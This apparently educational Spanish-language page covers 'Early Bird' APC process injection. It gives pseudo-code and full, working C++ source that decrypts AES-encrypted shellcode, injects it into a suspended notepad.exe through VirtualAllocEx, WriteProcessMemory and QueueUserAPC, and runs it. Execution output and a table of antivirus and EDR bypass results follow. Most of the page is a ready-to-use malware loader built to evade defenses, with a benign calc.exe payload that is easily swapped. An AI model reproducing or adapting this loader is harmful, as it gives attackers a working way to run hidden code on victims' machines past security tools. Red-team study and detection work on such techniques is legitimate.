---
layout: default
---

# Inyección Earlybird

La característica principal de este tipo de inyeción, se centra en el concepto de que no es necesaria la busqueda de un proceso en el Sistema Operativo. Ya que, el propio binario se encargará de crearlo.
El flujo de ejecución, será el siguiente:
- El binario malicioso, crea un nuevo proceso en modo suspensión obteniendo el identificador de proceso y el identificacor del hilo.
- El binario malicioso, reserva buffer de memoria en el espacio de memoria del proceso creado.
- El binario malicioso, se encarga de escribir el shellcode en el buffer reservado.
- El binario malicioso, utiliza una llamada APC (Asynchronous Process Call) para encolar una llamada, en la que invoca al hilo remoto para la ejecución del shellcode.
- Se resume el hilo remoto que hace que que hilo entre en `estado de alerta` y consuma la llamada asincrona remota encolada que hace que se ejecute el shellcode desde la posiciñon de memoria del buffer reservado. 

`Este tipo de inyección, cubre parte de las anteriores y será la dirección que tomemos a la hora de realiza  el bypass del EDR.`

## Diagrama de flujo

![Earlybird diagram](/assets/images/earlybird_diagram.png)

## Pseudo-codigo

```c++
// 1. Creamos un nuevo proceso en el sistema operativo, en estado suspendido
PROCESS_INFORMATION pi
CreateProcessA(0, "notepad.exe", ..., CREATE_SUSPENDED, ..., &pi)

// 2. Reservamos memoria para nuestro shellcode en el mapa de memoria del nuevo proceso remoto
pRemoteCode = VirtualAllocEx(pi.hProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. Escribimos nuestro payload en el buffer reservado
WriteProcessMemory(pi.hProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. Realizamos una invocación en APC
QueueUserAPC(pRemoteCode, pi.hThread, NULL)

// 5. Lanzamos un hilo de nuestro proceso apra que se ejecute el shellcode
ResumeThread(pi.hThread)
```

## Codigo fuente

```c++
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
unsigned char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}


int main(void) {
	int pid = 0;
    HANDLE hProc = NULL;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	void * pRemoteCode;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
	CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	printf("[injection] Process: %p \n\t notepadProcess %d \n\t notepadThread %d \n", GetCurrentProcess(), pi.hProcess, pi.hThread, payload, pRemoteCode);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));	
	pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
	getchar();
	printf("[injection] Process: %p \n\t RemoteProcess %d \n\t RemoteThread %d \n\t payload = %p \n\t RemoteCOde = %p \n", GetCurrentProcess(),pi.hProcess, pi.hThread, payload, pRemoteCode);
	ResumeThread(pi.hThread);
	getchar();
	return 0;
}
```

Es interesante en tiempo de ejecución, revisar los procesos del sistema operativo:

### Ejecución parte 1:

```
binaries\EXE>earlybird_injection.exe
[injection] Process: FFFFFFFFFFFFFFFF
         notepadProcess 176
         notepadThread 172
```
Se aprecia el proceso creado en estado suspensión, que cuelga del binario earlybird_injection.exe

![earlybird_1](/assets/images/earlybird_injection_1.png)

### Ejecución parte 2:

```
[injection] Process: FFFFFFFFFFFFFFFF
         RemoteProcess 176
         RemoteThread 172
         payload = 00007FF65CB1D000
         RemoteCOde = 000001ABFCFB0000
```
Sin tener dependencia aparente el nuevo proceso creado desde la inyección de código a traves del notepad.exe

![earlybird_1](/assets/images/earlybird_exe_2.png)

### Evidencia de ejecución

![earlybird_1](/assets/images/earlybird_evidence.png)

## Detecciones 

| Code Type  | Windows Defender Bypass | AV Bypass | EDR Bypass |
| ------------- | ------------- | ------------- | ------------- |
| EXE inyeccion técnica Earlybird  | True | 15/72 VT detections | False |

![Earlybird detections](/assets/images/earlybird_detection.png)

[back](./injection_types.html)
